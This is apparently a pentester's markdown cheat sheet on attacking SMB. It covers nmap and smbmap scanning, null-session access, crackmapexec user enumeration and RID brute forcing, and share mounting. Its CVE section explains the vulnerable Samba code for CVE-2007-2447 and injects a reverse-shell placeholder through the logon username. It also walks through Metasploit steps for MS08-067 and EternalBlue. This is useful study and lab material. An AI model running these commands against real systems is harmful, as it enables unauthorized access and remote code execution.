# SMB Pentest

## Reconnaissance

### Scan Vulnerabilities

#### nmap

```bash
nmap --script "smb-vuln*" 192.0.2.1
```

### Scan Host

#### smbmap

```bash
smbmap -H 192.0.2.1
```

## Null Session Vulnerability

- **Null sessions** means that accessing a share was granted without authentication.
- Usually, only `$IPC` can be accessed through null sessions, but other shares may be configured to allow access through null sessions.

### Connect using Null Session

#### smbclient

Use the `-N` flag

```bash
smbclient -L -N 192.0.2.1
```

#### crackmapexec

```bash
crackmapexec smb 192.0.2.1 -u '' -p ''
```

## Enumerations

### Shares

#### smbclient

Without password

```shell
$ smbclient -L '\\192.0.2.1' -U username
Password for [MYGROUP\james]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
```

With password

```bash
smbclient -L '\\192.0.2.1' -U username --password=password
```

### Users

#### crackmapexec

```bash
crackmapexec smb 192.0.2.1 -u user -p password --users
```

### Users (RID Brute Forcing)

#### crackmapexec

```bash
crackmapexec smb 192.0.2.1 -u user -p password --rid-brute
```

### Groups

#### crackmapexec

```bash
crackmapexec smb 192.0.2.1 -u user -p password --groups
```

### Hosts

#### crackmapexec

```bash
crackmapexec smb 192.0.2.1 -u user -p password --shares
```

### Sessions

#### crackmapexec

```bash
crackmapexec smb 192.0.2.1 -u user -p password --sessions
```

## Access Share

### smbclient

Connect to SMB server

```shell
$ smbclient //192.0.2.1/Public
Enter WORKGROUP\<username>'s password:
Try "help" to get a list of possible commands.
smb: \> 
```

Connect to SMB server without password

```bash
smbclient -N //192.0.2.1/Public
```

List available services

```bash
smbclient -L //192.0.2.1/Public
```

Connect using older SMB versions

```bash
smbclient -N //192.0.2.1/Public --option='client min protocol=NT1'
```

#### List Directories

```shell
smb: \> ls
```

```shell
smb: \> dir
```

#### Download File

```shell
smb: \> get foo.txt
```

#### Upload File

```shell
smb: \> put foo.txt
```

#### Download Directory

```shell
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget foo/
```

### mount.cifs (UNIX)

```bash
sudo mount -t cifs //192.0.2.1/SHARE /mnt/smb -o username=USERNAME,password=PASSWORD
```

### net.exe (Cmd)

```powershell
net use Z: \\192.0.2.1\SHARE /u:DOMAIN\USERNAME PASSWORD
```

### New-SmbMapping (Powershell)

```powershell
New-SmbMapping -LocalPath 'Z:' -RemotePath '\\192.0.2.1\SHARE' -UserName "USERNAME" -Password "PASSWORD"
```

### New-PSDrive (Powershell)

```powershell
New-PSDrive -Name Z -PSProvider "FileSystem" -Root "\\192.0.2.1\SHARE" -UserName "DOMAIN\USERNAME" -Password "PASSWORD"
```

## Post Exploitation

### Get All Local Shares

```powershell
Get-SMBShare
```

### Get Shares from Another Computer

```powershell
net use \\dc.example.com\IPC$ /u:DOMAIN\username password
net view \\dc.example.com
```

### Mount Shares from Another Computer

```powershell
net use Z: \\dc.example.com\SYSVOL /u:DOMAIN\username password
```

## CVEs

### CVE-2007-2447

> The MS-RPC functionality in smbd in Samba 3.0.0 through 3.0.25rc3 allows remote attackers to execute arbitrary commands via shell metacharacters involving the (1) SamrChangePassword function, when the "username map script" smb.conf option is enabled, and allows remote authenticated users to execute commands via shell metacharacters involving other MS-RPC functions in the (2) remote printer and (3) file share management.

#### Vulnerable Code

- `source/lib/username.c`
    ```c
    /* first try the username map script */

    if ( *cmd ) { 
        char **qlines;
        pstring command;
        int numlines, ret, fd; 

        pstr_sprintf( command, "%s \"%s\"", cmd, user );

        DEBUG(10,("Running [%s]\n", command));
        ret = smbrun(command, &fd);
        ...
    ```
    - The code puts `username` onto the end of `cmd`, then it tossing `command` into `smbrun`
- `source/lib/smbrun.c`
    ```c
    ...
    execl("/bin/sh","sh","-c",cmd,NULL);  
    ...
    ```
    - Here, `cmd` is not sanitized.

#### Exploitation

Set `username` to ``/`nohup <payload>` ``
    - `/` is used to separate the domain & the user name

```shell
$ smbclient -N //192.0.2.1/<share>
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> logon "/`nohup <reverse_shell>`"
Password: 
session setup failed: NT_STATUS_LOGON_FAILURE
```
    
#### Metasploit

```console
msf > use exploit/multi/samba/usermap_script
msf exploit(usermap_script) > show targets
    ...targets...
msf exploit(usermap_script) > set TARGET < target-id >
msf exploit(usermap_script) > show options
    ...show and set options...
msf exploit(usermap_script) > exploit
```

### CVE-2008-4250 (MS08-067)

#### Cause

`NetprPathCanonicalize` function in `netapi32.dll` handles parsing incorrectly, result in buffer overflow.

#### Exploit

- <https://github.com/MF-R00T/ms08_067>

#### Metasploit

```
msf > use exploit/windows/smb/ms08_067_netapi
msf exploit(ms08_067_netapi) > show targets
    ...targets...
msf exploit(ms08_067_netapi) > set TARGET < target-id >
msf exploit(ms08_067_netapi) > show options
    ...show and set options...
msf exploit(ms08_067_netapi) > exploit
```

### CVE-2017-0144 (MS17-010)

#### Analysis

- <https://research.checkpoint.com/2017/eternalblue-everything-know/>

#### Exploit

- <https://github.com/3ndG4me/AutoBlue-MS17-010>

#### Metasploit

```
msf > use exploit/windows/smb/ms17_010_eternalblue
msf exploit(ms17_010_eternalblue) > show targets
    ...targets...
msf exploit(ms17_010_eternalblue) > set TARGET < target-id >
msf exploit(ms17_010_eternalblue) > show options
    ...show and set options...
msf exploit(ms17_010_eternalblue) > exploit
```

## Packet Analysis

### Recover Session Key

- <https://medium.com/maverislabs/decrypting-smb3-traffic-with-just-a-pcap-absolutely-maybe-712ed23ff6a2>
- TODO

## Tools

- [smbmap](https://github.com/ShawnDEvans/smbmap) - Enumerate samba share drives across an entire domain
- [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) - A swiss army knife for pentesting networks
- [nbtscan](https://github.com/resurrecting-open-source-projects/nbtscan) - Scan networks for NetBIOS name information

## Reference

- https://github.com/amriunix/CVE-2007-2447
- https://forum.hackthebox.com/t/why-does-cve-2007-2447-require-to-work/3165/6
- https://0x00sec.org/t/cvexplained-cve-2007-2447/22748
- https://web.archive.org/web/20150426072443/https://www.mysonicwall.com/sonicalert/searchresults.aspx?ev=article&id=74
- https://labs.withsecure.com/content/dam/labs/docs/hello-ms08-067-my-old-friend.pdf
- http://www.phreedom.org/blog/2008/decompiling-ms08-067/
- https://media.defcon.org/DEF%20CON%2026/DEF%20CON%2026%20presentations/DEFCON-26-zerosum0x0-Eternal-Exploits.pdf